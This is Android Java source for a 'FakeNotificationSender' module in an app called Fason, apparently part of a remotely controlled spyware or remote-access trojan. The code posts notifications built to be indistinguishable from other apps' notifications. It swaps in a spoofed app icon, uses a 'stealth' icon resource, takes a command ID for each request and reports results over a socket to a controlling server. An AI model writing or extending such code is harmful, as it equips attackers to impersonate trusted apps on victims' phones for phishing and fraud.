package com.fason.app.features.notification;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Icon;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.fason.app.R;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * v4.0 — FakeNotificationSender
 * Posts a customisable notification on the device, indistinguishable from a
 * real app notification. Supports: title, body, channel name, base64 large
 * icon, vibration, and badge count.
 */
public final class FakeNotificationSender {
    private static final String TAG = "FakeNotif";
    private static final AtomicInteger NOTIF_COUNTER = new AtomicInteger(10_000);

    private FakeNotificationSender() {}

    /**
     * Post a fake notification on the device.
     *
     * @param title       Notification title (required)
     * @param body        Notification body text (required)
     * @param channelId   Android notification channel id (created on first use)
     * @param channelName Human-readable channel name
     * @param iconB64     Base64-encoded PNG/JPEG for large icon (nullable)
     * @param vibrate     Whether to vibrate on post
     * @param cmdId       Command tracking ID for response
     */
    public static void send(
            String title, String body,
            String channelId, String channelName,
            String iconB64, boolean vibrate,
            String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) {
                sendResult(false, "NotificationManager unavailable", cmdId);
                return;
            }
            // Sanitise inputs
            if (title == null || title.isEmpty()) title = " ";
            if (body == null)   body = "";
            if (channelId == null || channelId.isEmpty()) channelId = Protocol.FAKE_NOTIF_CHANNEL;
            if (channelName == null || channelName.isEmpty()) channelName = "App";

            // Ensure the channel exists (idempotent on Android 8+)
            ensureChannel(nm, channelId, channelName, vibrate);

            NotificationCompat.Builder builder = new NotificationCompat.Builder(ctx, channelId)
                .setSmallIcon(R.drawable.ic_notif_stealth)   // use your existing small icon resource
                .setContentTitle(title)
                .setContentText(body)
                .setStyle(new NotificationCompat.BigTextStyle().bigText(body))
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC);

            if (vibrate) {
                builder.setVibrate(new long[]{0, 250, 100, 250});
            } else {
                builder.setVibrate(null);
            }

            // Decode and apply custom icon as BOTH small and large icon.
            // setSmallIcon(Icon.createWithBitmap) replaces the app's own icon in the
            // notification header, so it shows the spoofed app icon instead of Fason's.
            if (iconB64 != null && !iconB64.isEmpty()) {
                try {
                    byte[] decoded = Base64.decode(iconB64, Base64.DEFAULT);
                    Bitmap bmp = BitmapFactory.decodeByteArray(decoded, 0, decoded.length);
                    if (bmp != null) {
                        // Large icon — shown in expanded notification body
                        builder.setLargeIcon(bmp);
                        // Small icon — shown in status bar and notification header.
                        // Icon.createWithBitmap() available since API 23 (Android 6.0).
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            // Scale to 96x96 for small icon slot
                            Bitmap small = Bitmap.createScaledBitmap(bmp, 96, 96, true);
                            builder.setSmallIcon(Icon.createWithBitmap(small));
                        }
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Icon decode failed", e);
                }
            }

            int notifId = NOTIF_COUNTER.getAndIncrement();
            nm.notify(notifId, builder.build());
            sendResult(true, String.valueOf(notifId), cmdId);
            Log.d(TAG, "Fake notification posted id=" + notifId);
        } catch (Exception e) {
            Log.e(TAG, "send failed", e);
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    /** Cancel a specific notification by its ID. */
    public static void cancel(int notifId, String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.cancel(notifId);
            sendResult(true, "cancelled " + notifId, cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    /** Cancel all active notifications posted by this app. */
    public static void cancelAll(String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.cancelAll();
            sendResult(true, "all_cancelled", cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    // ── helpers ──────────────────────────────────────────────────────────────

    private static void ensureChannel(NotificationManager nm, String channelId, String channelName, boolean vibrate) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        // Skip if channel already exists
        if (nm.getNotificationChannel(channelId) != null) return;
        NotificationChannel ch = new NotificationChannel(
            channelId, channelName, NotificationManager.IMPORTANCE_HIGH);
        ch.setDescription(channelName);
        ch.setShowBadge(true);
        ch.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
        if (vibrate) {
            ch.enableVibration(true);
            ch.setVibrationPattern(new long[]{0, 250, 100, 250});
        } else {
            ch.enableVibration(false);
        }
        nm.createNotificationChannel(ch);
    }

    private static void sendResult(boolean success, String detail, String cmdId) {
        try {
            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, "fake_notif_result");
            r.put(Protocol.KEY_SUCCESS, success);
            if (detail != null) r.put(Protocol.KEY_MESSAGE, detail);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.NOTIF, r);
        } catch (Exception ignored) {}
    }
}
